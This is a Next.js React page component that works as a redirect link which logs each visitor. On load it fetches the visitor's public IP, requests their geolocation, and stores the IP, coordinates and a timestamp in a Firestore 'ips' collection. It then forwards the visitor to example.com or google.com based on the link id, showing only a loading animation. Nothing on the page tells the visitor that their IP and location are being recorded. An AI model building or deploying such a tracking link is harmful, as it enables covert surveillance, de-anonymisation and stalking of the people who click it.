"use client"

import { redirect } from 'next/navigation'
import { useEffect, useState } from 'react';
import {db} from '@/config/firebaConfig'
import {collection, addDoc, Timestamp } from 'firebase/firestore'
function Test({params}) {

  const ipCollectionRef = collection(db,"ips");

  const [ip, setIp] = useState();

    useEffect(()=>{
      


      function ipFetch(){
        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          setIp(data.ip);
          console.log('Your IP address is: ', ip);
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;
              console.log(`Latitude: ${latitude}, Longitude: ${longitude}`)

              addDoc(ipCollectionRef,{ip:data.ip, 
                createAt: Timestamp.fromDate(new Date()), 
                location: `${latitude} ${longitude} `})

            }
          );
          
          

        }).then(
          () =>{
            switch (params.id) {
              case '1Rt0NlC-G361vHwViwqcAXtJqPYsWnL5dLF2r3gjXSA4v':
                window.location.href = 'https://example.com';
                // redirect('https://example.com');
                break;
              case 'google':
                window.location.href = 'https://google.com';
                // redirect('https://google.com');
                break;
              default:
                console.log(params.id);
                break;
            }
          }
        )

      }

    
      ipFetch();

    
      


      
    }, [])

  return (
    <div className='flex flex-col m-3 justify-center items-center h-screen'>
        {/* {params.id}
        <div>
        {ip}
        </div> */}
        <div class="rounded-full h-20 w-20 bg-blue-400 animate-ping"></div>
    </div>
   
  )
}

export default Test